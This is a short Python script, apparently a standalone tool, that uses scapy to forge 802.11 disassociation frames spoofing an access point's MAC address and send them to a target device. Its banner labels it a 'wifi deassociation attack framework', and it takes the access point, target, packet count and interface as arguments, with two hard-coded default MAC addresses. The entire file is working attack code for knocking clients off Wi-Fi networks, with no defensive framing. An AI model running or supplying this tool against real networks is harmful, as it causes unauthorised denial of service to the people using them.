from scapy.all import *
import argparse

target_mac = "FC:DE:90:A4:E0:FF"
gateway_mac = "58:6D:8F:7B:87:07"

s = """

 ____          _                       _       _____ _ 
|  _ \  ___   / \   ___ ___  ___   ___(_)     |  ___(_)
| | | |/ _ \ / _ \ / __/ __|/ _ \ / __| |_____| |_  | |
| |_| |  __// ___ \\\__ \__ \ (_) | (__| |_____|  _| | |
|____/ \___/_/   \_\___/___/\___/ \___|_|     |_|   |_|
                                                       


wifi deassociation attack framework

"""


if __name__ == "__main__":
    print(s)

    argparser = argparse.ArgumentParser(
        description="deassociation request tool for 802.11"
    )
    argparser.add_argument(
        "-a",
        "--access_point",
        help="Access point MAC address: '11:11:11:11:11:11",
        required=True,
    )
    argparser.add_argument(
        "-t",
        "--target",
        help="Target MAC address: '11:11:11:11:11:11",
        required=True,
    )
    argparser.add_argument(
        "-c", "--count", help="Number of packets to sent.", default=1, type=int
    )

    argparser.add_argument("-i", "--interface", help="Interface", required=True)

    args = vars(argparser.parse_args())

    print(args, "\n")
    target_mac = args["target"]
    gateway_mac = args["access_point"]

    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Disas(reason=1)

    # send the packet
    sendp(
        packet,
        inter=0.1,
        count=args["count"],
        iface=args["interface"],
    )
